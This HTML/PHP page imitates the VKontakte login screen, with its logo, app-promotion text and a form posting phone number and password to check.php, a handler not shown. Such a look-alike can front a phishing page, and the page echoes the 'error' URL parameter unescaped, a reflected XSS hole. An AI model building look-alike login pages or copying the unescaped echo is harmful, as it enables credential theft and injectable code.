<!DOCTYPE html>
<html>
<head>
	<title>ВК</title>
	<meta charset="utf-8">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
	<style type="text/css">
		.search-input{
			border-radius: 15px;
			border:none;
			padding-top: 5px;
			padding-bottom: 5px;
			padding-left: 10px;		
			background: #224b7a;
			color: white;
			outline: none;
			width: 250px;
		}
	</style>
</head>
<body style="background-color: #EDEEF0">
	<!--шапка сайта-->
<div class="col-12" style="background-color: #4680C2">
	<div class="col-8 mx-auto">
		<div class="row">
			<div class="col-2">
				<img src="img/vk.png" class="w-25">
			</div>
			<div class="col-8">
				<input class="mt-1 search-input" placeholder="Поиск" >
			</div>
		</div>
	</div>
</div>
<!--тело сайта-->
<div class="col-8 mx-auto">
	<div class="row">
		<div class="col-8 text-center p-5">
			<h5 class="mt-3">ВКонтакте для мобильных устройств</h5>
			<p class="mt-3">Установите официальное мобильное приложение ВКонтакте и оставайтесь в курсе новостей Ваших друзей, где бы Вы ни находились.</p>
			<img class="mt-3" src="img/phones.png">
		</div>
		<div class="col-4 p-5">
			<div class="col-12 bg-white p-3">
				
				<form action="check.php" method="POST">			
					<input placeholder="Телефон" type="" name="phone" class="form-control">
					<input placeholder="Пароль" type="password" name="password" class="form-control mt-3">
					<button style="background-color: #4680C2; color: white" class="btn mt-3">Войти</button>
				</form>
				<p class="text-danger">
					<?echo $_GET['error']?>
				</p>
				
			</div>
		</div>
	</div>
</div>
</body>
</html>